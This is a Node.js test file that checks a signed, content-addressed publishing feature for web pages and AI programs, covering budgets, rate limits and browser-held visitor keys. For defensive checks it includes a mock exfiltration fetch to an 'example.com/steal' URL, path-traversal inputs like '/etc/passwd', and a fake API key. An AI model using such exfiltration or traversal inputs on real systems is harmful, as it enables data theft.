'use strict';
// Publications (design/92): frozen copies kept by their content, signed,
// each at its own address; web pages and AI programs, the program paid by its
// visitor (their key, in their browser, to their AI company only) or by its
// owner (a key for public programs, a budget in money, a limit per visitor).
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const net = require('node:net');
const http = require('node:http');
const crypto = require('node:crypto');
const { spawn, spawnSync } = require('node:child_process');
const { PublicationStore, verifyPublication, canonical, rootOf, cleanPath } = require('../publications.js');
const { chromiumBinary, chromiumAvailable, CHROMIUM_TEST_FLAGS } = require('./helpers/chromium.js');
const { fakeOpenAI } = require('./helpers/fake-openai.js');
const P = require('../anywhere/protocol.js');

const sleep = ms => new Promise(r => setTimeout(r, ms));
const freePort = async () => { const s = net.createServer(); await new Promise(r => s.listen(0, '127.0.0.1', r)); const p = s.address().port; await new Promise(r => s.close(r)); return p; };
const until = async (fn, label, ms = 20000) => { const t = Date.now(); while (!(await fn())) { if (Date.now() - t > ms) throw new Error('timeout: ' + label); await sleep(50); } };
const req = (port, host, p, opts = {}) => new Promise((res, rej) => {
  const q = http.request({ host: '127.0.0.1', port, path: p, method: opts.method || 'GET', headers: { Host: host, ...(opts.headers || {}) } }, r => { const c = []; r.on('data', d => c.push(d)); r.on('end', () => res({ status: r.statusCode, headers: r.headers, body: Buffer.concat(c) })); });
  q.on('error', rej); q.end(opts.body);
});

test('a version is its content: one fingerprint, checked against a signature, and any changed byte is caught', async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pubstore-'));
  try {
    const store = new PublicationStore({ dir });
    const files = [{ path: 'index.html', bytes: Buffer.from('<h1>hi</h1>'), type: 'text/html' }, { path: 'a/b.js', bytes: Buffer.from('x=1'), type: 'text/javascript' }];
    const a = await store.put({ kind: 'site', entry: 'index.html', files });
    const b = await store.put({ kind: 'site', entry: 'index.html', files: [...files].reverse() });
    assert.equal(a.root, b.root, 'the same files, in any order: the same fingerprint');
    assert.equal(a.root, rootOf(a.manifest));
    assert.equal(canonical({ b: 1, a: [2, { d: 3, c: 4 }] }), '{"a":[2,{"c":4,"d":3}],"b":1}');
    const c = await store.put({ kind: 'site', entry: 'index.html', files: [files[0], { ...files[1], bytes: Buffer.from('x=2') }] });
    assert.notEqual(c.root, a.root, 'one byte changed: another fingerprint');
    for (const bad of ['../x', '/etc/passwd', 'a//b', 'a\\b', '.', 'a/./b', '']) assert.equal(cleanPath(bad), null, bad);
    await assert.rejects(store.put({ kind: 'site', entry: 'index.html', files: [{ path: '../out', bytes: Buffer.from(''), type: 'x' }] }), /cannot be published/);
    // Signed by a computer's key, checked like anyone would.
    const pair = await P.subtle().generateKey(P.ECDSA, true, ['sign', 'verify']);
    const spki = new Uint8Array(await P.subtle().exportKey('spki', pair.publicKey));
    const doc = { manifest: a.manifest, root: a.root, signature: P.b64u(await P.sign(pair.privateKey, P.toBytes('chattering-publication/1\n' + a.root))), signer: { id: await P.homeIdOf(spki), key: P.b64u(spki) } };
    const bytesOf = p => fs.readFileSync(store.blobPath(a.manifest.files[p].sha256));
    assert.deepEqual((await verifyPublication(doc, async p => bytesOf(p))).problems, []);
    assert.match((await verifyPublication(doc, async p => p === 'a/b.js' ? Buffer.from('x=9') : bytesOf(p))).problems.join(), /a\/b\.js: changed/);
    assert.match((await verifyPublication({ ...doc, root: c.root }, async p => bytesOf(p))).problems.join(), /does not hash/);
    const other = await P.subtle().generateKey(P.ECDSA, true, ['sign', 'verify']);
    assert.match((await verifyPublication({ ...doc, signature: P.b64u(await P.sign(other.privateKey, P.toBytes('chattering-publication/1\n' + a.root))) }, async p => bytesOf(p))).problems.join(), /signature does not match/);
    assert.match((await verifyPublication({ ...doc, signer: { ...doc.signer, id: 'AAAAAAAAAAAAAAAAAAAAAA' } }, async p => bytesOf(p))).problems.join(), /not the computer it names/);
    // Versions no publication names go, and their files with them.
    await store.gc([c.root]);
    assert.equal(store.manifest(a.root), null);
    assert.ok(store.manifest(c.root));
    assert.equal(fs.readdirSync(path.join(dir, 'blobs')).length, 2);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test('publishing: a web page and an AI program, each at its own address; paid by its owner within limits, or by its visitor in their own browser', { timeout: 180000 }, async t => {
  const root = path.join(__dirname, '..'), home = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), 'publish-')));
  const agent = path.join(home, '.pi/agent'), sessions = path.join(agent, 'sessions/fx'), work = path.join(home, 'work'), site = path.join(work, 'game');
  fs.mkdirSync(sessions, { recursive: true }); fs.mkdirSync(path.join(site, 'img'), { recursive: true }); fs.mkdirSync(path.join(work, 'node_modules', 'x'), { recursive: true });
  spawnSync('git', ['init', '-q'], { cwd: work });
  fs.writeFileSync(path.join(site, 'index.html'), '<!doctype html><title>Game</title><h1>THE GAME</h1><script src="game.js"></script>');
  fs.writeFileSync(path.join(site, 'game.js'), 'document.title = "played"; const OPENAI_API_KEY = "sk-abcdefghijklmnopqrstuvwxyz123456";');
  fs.writeFileSync(path.join(site, '.env'), 'SECRET=1');
  fs.writeFileSync(path.join(site, 'img', 'a.svg'), '<svg xmlns="http://www.w3.org/2000/svg"/>');
  fs.writeFileSync(path.join(sessions, 'c.jsonl'), JSON.stringify({ type: 'session', version: 3, id: 'fx', cwd: work }) + '\n');
  const { appDir } = require('./helpers/home-env.js');
  // A program made here, published on its page (the real one Chattering makes, as saved).
  const data = appDir(home, 'data'), made = path.join(data, 'programs');
  const fixture = path.join(__dirname, 'fixtures', 'program-fix-writing');
  const version = 'sha256:' + JSON.parse(fs.readFileSync(path.join(fixture, 'version.json'), 'utf8')).hex;
  const vdir = path.join(made, 'published', 'fix_writing', version.slice(7, 39));
  fs.mkdirSync(vdir, { recursive: true }); fs.mkdirSync(path.join(made, 'made', 'fix_writing'), { recursive: true });
  for (const f of ['program.json', 'functai.json']) { fs.copyFileSync(path.join(fixture, f), path.join(vdir, f)); fs.copyFileSync(path.join(fixture, f), path.join(made, 'made', 'fix_writing', f)); }
  fs.writeFileSync(path.join(made, 'registry.json'), JSON.stringify({ programs: { fix_writing: { name: 'fix_writing', module: 'programs', folder: path.join(made, 'made', 'fix_writing'), project: null, created: new Date().toISOString(), by: 'u_test', live: { version, at: new Date().toISOString(), by: 'u_test' }, published: [{ version, at: new Date().toISOString(), by: 'u_test' }], tests: {}, keys: [] } } }));
  const calls = path.join(home, 'functai-calls');
  // The AI company: a fake that answers web pages too, and counts what it is asked.
  const ai = await fakeOpenAI({ cors: true, models: ['llama-3.3-70b-versatile'], reply: p => (p.response_format ? JSON.stringify({ fixed_text: 'Hello, world.' }) : '<fixed_text>\nHello, world.\n</fixed_text>') });
  let server, browser, cdp;
  const stop = async child => {
    if (!child || child.exitCode !== null || child.signalCode !== null) return;
    const exited = new Promise(r => child.once('exit', r)); child.kill('SIGTERM');
    const timer = setTimeout(() => child.kill('SIGKILL'), 3000); await exited; clearTimeout(timer);
  };
  t.after(async () => { cdp?.close(); await require('./helpers/cleanup.js').stopAndRemove(browser, null); await stop(server); await ai.close(); await require('./helpers/cleanup.js').stopAndRemove(null, home); });

  const port = await freePort(), pv = await freePort(), token = 'pub-token', auth = { Authorization: 'Bearer ' + token };
  let log = '';
  require('./helpers/first-run.js').answerFirstRun(home);
  server = spawn(process.execPath, ['server.js'], { cwd: root, env: { ...process.env, ...require('./helpers/home-env.js').homeEnv(home), PORT: String(port), CHATTERING_PREVIEW_PORT: String(pv), CHATTERING_TLS_PORT: '0', CHATTERING_HOST: '127.0.0.1',
    CHATTERING_TOKEN: token, CHATTERING_NO_SYNC: '1', CHATTERING_NO_PUBLIC_LINKS: '1', CHATTERING_CACHE_DIR: path.join(home, 'cache'), CHATTERING_CHECKPOINT_DIR: path.join(home, 'cp'), CHATTERING_DELEGATION_ROOT: path.join(home, 'dg'),
    PI_CODING_AGENT_DIR: agent, PI_AGENT_DIR: agent, FUNCTAI_LOG_CALLS: calls, CHATTERING_TEST_PROVIDER_BASE: ai.baseUrl }, stdio: ['ignore', 'pipe', 'pipe'] });
  server.stdout.on('data', b => log += b); server.stderr.on('data', b => log += b);
  const api = async (p, body) => { const r = await fetch('http://127.0.0.1:' + port + p, body ? { method: 'POST', headers: { ...auth, 'Content-Type': 'application/json' }, body: JSON.stringify(body) } : { headers: auth }); return { status: r.status, body: await r.json().catch(() => null) }; };
  await until(async () => { try { return (await fetch('http://127.0.0.1:' + port + '/api/sessions', { headers: auth })).ok; } catch { return false; } }, 'the server\n' + log);

  // ---- a web page ----------------------------------------------------------
  const prev = (await api('/api/publications/preview', { type: 'site', path: site })).body;
  assert.equal(prev.slug, 'game');
  assert.deepEqual(prev.excluded.map(e => e.path), ['.env'], 'hidden files never go out');
  assert.deepEqual(prev.warnings, [{ path: 'game.js', kinds: ['API key'] }], 'and what looks like a key is pointed out');
  assert.equal(prev.count, 3);
  const pub = (await api('/api/shares', { kind: 'publication', type: 'site', path: site, slug: 'game', access: 'link' })).body.share;
  assert.equal((await api('/api/shares', { kind: 'publication', type: 'site', path: site, slug: 'game', access: 'link' })).status, 409, 'one address, one publication');
  const host = 'game.pub.localhost', secret = pub.links.find(l => l.where === 'local').url.split('#k=')[1];
  let r = await req(pv, host, '/', { headers: { Accept: 'text/html' } });
  assert.match(r.body.toString(), /Opening/, 'without its link, only the page that asks for it');
  assert.equal((await req(pv, host, '/game.js')).status, 401);
  r = await req(pv, host, '/_chattering/open', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ secret }) });
  const cookie = String(r.headers['set-cookie']).split(';')[0];
  r = await req(pv, host, '/', { headers: { Cookie: cookie } });
  assert.match(r.body.toString(), /THE GAME/);
  assert.equal(r.headers['x-chattering-fingerprint'], pub.root);
  assert.equal(r.headers['repr-digest'], 'sha-256=:' + crypto.createHash('sha256').update(r.body).digest('base64') + ':');
  assert.equal((await req(pv, host, '/.env', { headers: { Cookie: cookie } })).status, 404);
  assert.equal((await req(pv, host, '/s/' + pub.id + '/', { headers: { Cookie: cookie } })).status, 404, 'nothing but the publication at its address');
  const doc = JSON.parse((await req(pv, host, '/.well-known/chattering-publication.json', { headers: { Cookie: cookie } })).body);
  assert.deepEqual((await verifyPublication(doc, async p => (await req(pv, host, '/_v/' + doc.root + '/' + p, { headers: { Cookie: cookie } })).body)).problems, []);
  // A new version; the old one stays reachable by its fingerprint, and can be made current again.
  fs.writeFileSync(path.join(site, 'index.html'), '<!doctype html><h1>VERSION TWO</h1>');
  const v2 = (await api('/api/shares/change', { id: pub.id, republish: true })).body.share;
  assert.equal(v2.versions.length, 2);
  assert.match((await req(pv, host, '/', { headers: { Cookie: cookie } })).body.toString(), /VERSION TWO/);
  assert.match((await req(pv, host, '/_v/' + pub.root + '/', { headers: { Cookie: cookie } })).body.toString(), /THE GAME/);
  await api('/api/shares/change', { id: pub.id, root: pub.root });
  assert.match((await req(pv, host, '/', { headers: { Cookie: cookie } })).body.toString(), /THE GAME/);
  // Public: no link needed. A new secret ends the old link's sessions.
  await api('/api/shares/change', { id: pub.id, access: 'public' });
  assert.match((await req(pv, host, '/')).body.toString(), /THE GAME/);

  // ---- an AI program -------------------------------------------------------
  assert.equal((await api('/api/shares', { kind: 'publication', type: 'program', program: 'fix_writing', slug: 'fix', access: 'public', pay: { owner: { provider: 'groq', model: 'no-such-model-price', monthlyUsd: 1 } } })).status, 400, 'no budget without a price');
  const prog = (await api('/api/shares', { kind: 'publication', type: 'program', program: 'fix_writing', slug: 'fix', access: 'public', title: 'Fix my writing',
    pay: { owner: { provider: 'groq', model: 'llama-3.3-70b-versatile', monthlyUsd: 1, perVisitorPerHour: 2 }, shareCalls: true } })).body.share;
  const ph = 'fix.pub.localhost';
  r = await req(pv, ph, '/');
  assert.match(r.headers['content-security-policy'], /script-src 'self';/);
  assert.match(r.headers['content-security-policy'], /connect-src 'self' https:\/\/api\.openai\.com .*https:\/\/api\.anthropic\.com/);
  let info = JSON.parse((await req(pv, ph, '/_chattering/program')).body);
  assert.equal(info.ownerPays.available, false);
  assert.match(info.ownerPays.why, /key is not set/);
  assert.equal((await api('/api/publications/keys', { provider: 'groq', key: 'gsk_test-owner-key' })).status, 200);
  assert.equal((await api('/api/publications/keys')).body.providers.find(p => p.id === 'groq').hasKey, true);
  assert.ok(!JSON.stringify((await api('/api/publications/keys')).body).includes('gsk_test'), 'the key is never sent back');
  info = JSON.parse((await req(pv, ph, '/_chattering/program')).body);
  assert.equal(info.ownerPays.available, true);
  // Paid by its owner: an answer, then the per-visitor limit.
  const run = () => req(pv, ph, '/', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text: 'helo wrold' }) });
  r = await run();
  assert.equal(r.status, 200, r.body.toString());
  assert.equal(JSON.parse(r.body).result, 'Hello, world.');
  const ownerCall = ai.requests.filter(q => q.method === 'POST').pop();
  assert.equal(ownerCall.auth, 'Bearer gsk_test-owner-key', 'the owner\u2019s key for public programs');
  assert.equal((await run()).status, 200);
  r = await run();
  assert.equal(r.status, 429, 'two an hour for each visitor here');
  assert.ok(r.headers['retry-after']);
  assert.equal((await req(pv, ph, '/', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ wrong: 1 }) })).status, 429);
  const spent = (await api('/api/shares?program=fix_writing')).body.shares[0].spent;
  assert.equal(spent.calls, 2);
  assert.ok(spent.usd > 0 && spent.usd < 0.01, 'counted in money: ' + spent.usd);
  // The budget: a tiny one is spent at once; the reason is said.
  await api('/api/shares/change', { id: prog.id, pay: { owner: { provider: 'groq', model: 'llama-3.3-70b-versatile', monthlyUsd: 0.000001, perVisitorPerHour: 100 }, shareCalls: true } });
  r = await run();
  assert.equal(r.status, 402, r.body.toString());
  assert.match(JSON.parse(r.body).error, /budget/);
  const desc = JSON.parse((await req(pv, ph, '/', { headers: { Accept: 'application/json' } })).body);
  assert.equal(desc.name, 'fix_writing'); assert.equal(desc.functai, '/functai.json');

  // ---- paid by its visitor, in a real browser ------------------------------
  if (!chromiumAvailable()) return t.skip('chromium is not installed');
  browser = spawn(chromiumBinary(), [...CHROMIUM_TEST_FLAGS, '--no-sandbox', '--disable-gpu', '--disable-background-networking', '--disable-sync', '--no-first-run', '--user-data-dir=' + path.join(home, 'b'), '--remote-debugging-port=0', 'about:blank'], { stdio: ['ignore', 'ignore', 'pipe'] });
  const endpoint = await new Promise((resolve, reject) => { let out = ''; const timer = setTimeout(() => reject(Error(out)), 10000); browser.stderr.on('data', b => { out += b; const m = out.match(/DevTools listening on (ws:\/\/[^\s]+)/); if (m) { clearTimeout(timer); resolve(m[1]); } }); });
  cdp = new WebSocket(endpoint); await new Promise(res => cdp.onopen = res);
  let id = 0; const pending = new Map(), problems = [], csp = [];
  cdp.onmessage = e => {
    const m = JSON.parse(e.data);
    if (m.method === 'Runtime.exceptionThrown') problems.push(m.params.exceptionDetails.exception?.description || m.params.exceptionDetails.text);
    if (m.method === 'Log.entryAdded' && /Content Security Policy/.test(m.params.entry.text)) csp.push(m.params.entry.text);
    if (pending.has(m.id)) { pending.get(m.id)(m); pending.delete(m.id); }
  };
  const send = (method, params = {}, sessionId) => new Promise(res => { pending.set(++id, res); cdp.send(JSON.stringify({ id, method, params, sessionId })); });
  const target = await send('Target.createTarget', { url: 'about:blank' });
  const sid = (await send('Target.attachToTarget', { targetId: target.result.targetId, flatten: true })).result.sessionId;
  await send('Runtime.enable', {}, sid); await send('Page.enable', {}, sid); await send('Log.enable', {}, sid);
  const evaluate = async expression => { const out = await send('Runtime.evaluate', { expression, awaitPromise: true, returnByValue: true }, sid); return out.result?.result?.value; };
  const waitFor = (expression, label) => until(async () => await evaluate(`(()=>{try{return !!(${expression})}catch{return false}})()`), label + '\n' + problems.join('\n') + '\n' + log.slice(-1500), 30000);
  await send('Page.navigate', { url: `http://${ph}:${pv}/` }, sid);
  await waitFor(`document.getElementById('app') && !document.getElementById('app').hasAttribute('aria-busy') && document.getElementById('in_text')`, 'the program page');
  assert.equal(await evaluate(`document.getElementById('title').textContent`), 'Fix my writing');
  assert.equal(await evaluate(`document.getElementById('fingerprint').textContent`), prog.root.slice(0, 12));
  assert.match(await evaluate(`document.getElementById('payOwnerNote').textContent`), /not available right now: this month.s budget is spent/);
  // The visitor's own key, the share box ticked.
  const before = ai.requests.length;
  await evaluate(`(() => { document.getElementById('in_text').value = 'helo wrold'; document.getElementById('provider').value = 'groq'; document.getElementById('provider').dispatchEvent(new Event('change')); return 1; })()`);
  await sleep(200);
  await evaluate(`(() => { document.getElementById('model').value = 'llama-3.3-70b-versatile'; document.getElementById('key').value = 'gsk_visitor-own-key'; document.getElementById('share').checked = true; document.querySelector('input[name=pay][value=visitor]').click(); document.getElementById('run').click(); return 1; })()`);
  await waitFor(`/Hello, world\\./.test(document.getElementById('outputs').textContent)`, 'the answer, from the visitor\u2019s browser');
  const visitorCall = ai.requests.slice(before).find(q => q.method === 'POST');
  assert.equal(visitorCall.auth, 'Bearer gsk_visitor-own-key', 'straight from the page to the AI company, with the visitor\u2019s key');
  await waitFor(`/Sent to/.test(document.getElementById('status').textContent)`, 'the call shared');
  // It is in the owner's call log, as FunctAI's own record: never the key, nor the address.
  const day = fs.readdirSync(calls).sort().pop();
  const shared = fs.readFileSync(path.join(calls, day, 'visitors-' + prog.id + '.jsonl'), 'utf8').trim().split('\n').map(JSON.parse);
  assert.equal(shared.length, 1);
  assert.equal(shared[0].program.name, 'fix_writing');
  assert.equal(shared[0].caller.kind, 'visitor');
  assert.match(shared[0].caller.visitor, /^[0-9a-f]{16}$/);
  assert.equal(shared[0].inputs.text, 'helo wrold');
  assert.ok(!JSON.stringify(shared[0]).includes('gsk_visitor'), 'the visitor\u2019s key is not in it');
  assert.ok(!JSON.stringify(shared[0]).includes('127.0.0.1'), 'nor their address');
  // The page cannot send anything to any other address: its policy says no.
  const leak = await evaluate(`fetch('https://example.com/steal?k=x').then(() => 'sent', e => 'blocked: ' + e.message)`);
  assert.match(leak, /^blocked/);
  await until(() => csp.some(c => /example\.com/.test(c)), 'the browser reports the refusal');
  // Remembered on this device: encrypted, back after a reload; forgotten on request.
  await evaluate(`document.getElementById('remember').checked = true; document.getElementById('run').click(); 1`);
  await sleep(800);
  await send('Page.reload', {}, sid);
  await waitFor(`document.getElementById('key') && document.getElementById('key').value === 'gsk_visitor-own-key'`, 'the remembered key');
  await evaluate(`document.getElementById('forget').click(); 1`);
  await sleep(300);
  await send('Page.reload', {}, sid);
  await waitFor(`document.getElementById('key') && document.getElementById('app') && !document.getElementById('app').hasAttribute('aria-busy')`, 'the page again');
  assert.equal(await evaluate(`document.getElementById('key').value`), '');
  assert.deepEqual(problems, []);
});
